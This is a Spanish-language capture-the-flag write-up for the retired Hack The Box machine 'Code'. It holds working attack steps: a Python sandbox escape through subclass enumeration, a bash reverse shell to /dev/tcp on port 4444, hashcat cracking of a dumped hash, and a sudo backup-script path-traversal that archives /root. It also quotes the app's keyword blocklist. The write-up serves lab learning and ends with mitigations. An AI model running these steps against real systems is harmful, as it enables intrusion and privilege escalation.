---
machine: Code
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, python, sandbox-escape, bcrypt, backy, sudo]
---

# Code — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Un editor de Python en el navegador (Flask en el 5000) con una **blocklist de palabras**: `import`, `os`, `subprocess`, `eval`, `__`… El filtro es textual, pero el intérprete sigue teniendo cargadas todas las clases, así que se sale del *sandbox* enumerando subclases y llamando a `subprocess.Popen` por índice. Shell como `app-production`; la SQLite de la app guarda el hash de `martin`, y la escalada es un `sudo` sobre `backy.sh`, cuyo JSON de configuración acepta traversal y archiva `/root`.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 9.x
5000/tcp  http  Flask (Python Playground)
```

La aplicación ejecuta el código que pegas y devuelve la salida. El filtro es una lista de cadenas: `eval, exec, import, open, os, read, system, write, subprocess, __import__, __builtins__` (lista real de la build).

## Enumeración

- 5000 es **Gunicorn 20.0.4** sirviendo el editor; no hay vhosts ni rutas ocultas.
- El editor no pide cuenta: se ejecuta código de inmediato.

## Foothold

El filtro busca cadenas, no objetos. Con acceso a `().__class__` se llega a todas las clases cargadas: basta localizar la posición de `Popen` y llamarla.

```python
# localizar el índice de Popen en el entorno de la víctima
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    if c.__name__ == "Popen":
        print(i)
```

Si `__` está prohibido, se construye el nombre con `getattr` y cadenas:

```python
g = getattr
base = g(g(() , "_"*2 + "class" + "_"*2), "_"*2 + "mro" + "_"*2)()[-1]
P = g(base, "_"*2 + "subclasses" + "_"*2)()[317]
P(["bash", "-c", "bash -i >& /dev/tcp/<IP>/4444 0>&1"])
```

```bash
nc -lvnp 4444
```

```text
app-production@code:~$
```

## Movimiento lateral

```bash
ls /var/www/app/instance/
sqlite3 /var/www/app/instance/database.db "select username, password from users;"
```

```text
martin | <hash>  (MD5 sin sal en unas builds, bcrypt en otras)
```

Los writeups públicos no coinciden: unos ven **MD5 sin sal** (`-m 0`, cae en CrackStation) y otros **bcrypt** (`-m 3200`). Mirar el prefijo en la base real antes de elegir modo.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh martin@<IP>
```

## Escalada de privilegios

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`backy.sh` es un wrapper de `/usr/bin/backy` (Go). Pasa `directories_to_archive` por `jq 'gsub("\\.\\./"; "")'` —una sola pasada— y después exige que cada ruta empiece por `/var/` o `/home/`. Con `....//` la limpieza deja `../`, la allowlist se cumple por el prefijo y el `tar` sale hasta `/root`.

```bash
mkdir -p /tmp/exf && cd /tmp/exf
cat > cfg.json <<'EOF'
{
  "destination": "/tmp/exf/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": ["/home/....//root"]
}
EOF
sudo /usr/bin/backy.sh /tmp/exf/cfg.json
ls /tmp/exf
```

Del `.tar.bz2` salen `root.txt` y, si existe, `/root/.ssh/id_rsa`.

## Evidencia

```text
/home/martin/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- Una **blocklist** de identificadores no es un sandbox: si el runtime expone `object`, cualquier filtro es decorativo.
- Los hashes bcrypt de una SQLite de aplicación se rompen con reglas y diccionario; el usuario de la app suele reutilizar contraseña.
- `sudo` sobre un script que consume configuración equivale a `sudo` sobre lo que esa configuración controle.
- Mitigación: `RestrictedPython` con AST validado, contenedor sin capacidad de red, `sudo` con argumentos fijos y validación de rutas con `realpath`.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.

## Referencias

- Documentación de la plataforma y del servicio afectado.
